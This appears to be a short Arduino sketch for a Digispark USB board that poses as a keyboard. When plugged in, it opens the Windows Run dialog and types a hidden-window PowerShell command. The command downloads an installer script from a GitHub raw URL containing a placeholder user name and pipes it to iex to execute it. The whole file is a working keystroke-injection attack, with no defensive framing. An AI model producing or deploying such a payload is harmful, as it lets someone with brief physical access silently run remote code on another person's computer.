#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(400);

  DigiKeyboard.print("powershell -w hidden -c \"irm https://raw.githubusercontent.com/<YOUR-USER>/S-M-Toolkit/main/installer/install.ps1 | iex\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
